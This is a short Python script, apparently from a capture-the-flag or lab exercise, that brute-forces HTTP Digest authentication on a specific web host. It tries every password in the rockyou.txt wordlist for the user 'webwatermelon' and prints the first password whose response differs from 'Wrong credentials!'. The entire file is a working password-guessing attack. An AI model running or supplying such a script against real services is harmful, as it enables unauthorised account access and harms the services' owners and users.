from urllib import response
import requests
from requests.auth import HTTPDigestAuth

with open('../text_files/rockyou.txt') as file:
    for line in file:
        # print("Now trying " + line.rstrip())
        response = requests.get('https://694.gallant-wright.xyz/landing', auth=HTTPDigestAuth('webwatermelon', line.rstrip()))
        response.encoding = 'utf-8'
        if(response.text != 'Wrong credentials!'):
            print("Success! Password: " + line.rstrip())
            exit()